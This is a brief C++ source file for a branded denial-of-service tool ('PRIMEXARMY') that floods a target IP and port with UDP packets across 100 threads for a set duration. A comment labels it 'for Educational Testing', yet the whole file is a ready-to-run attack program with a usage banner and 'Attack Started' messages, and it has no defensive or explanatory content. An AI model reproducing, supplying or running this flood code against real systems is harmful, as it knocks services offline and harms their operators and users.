#include <iostream>
#include <vector>
#include <thread>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

// Basic UDP Flood Logic for Educational Testing
void attack(string ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

    char buffer[1024]; // 1KB Packet size
    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        cout << "Usage: ./PRIME <IP> <PORT> <TIME>" << endl;
        return 1;
    }

    string target_ip = argv[1];
    int target_port = stoi(argv[2]);
    int duration = stoi(argv[3]);

    cout << "🚀 PRIMEXARMY Attack Started on " << target_ip << endl;

    // Multi-threading for more power
    vector<thread> threads;
    for (int i = 0; i < 100; i++) { // 100 Threads
        threads.push_back(thread(attack, target_ip, target_port, duration));
    }

    for (auto &t : threads) t.join();

    cout << "✅ Attack Finished." << endl;
    return 0;
}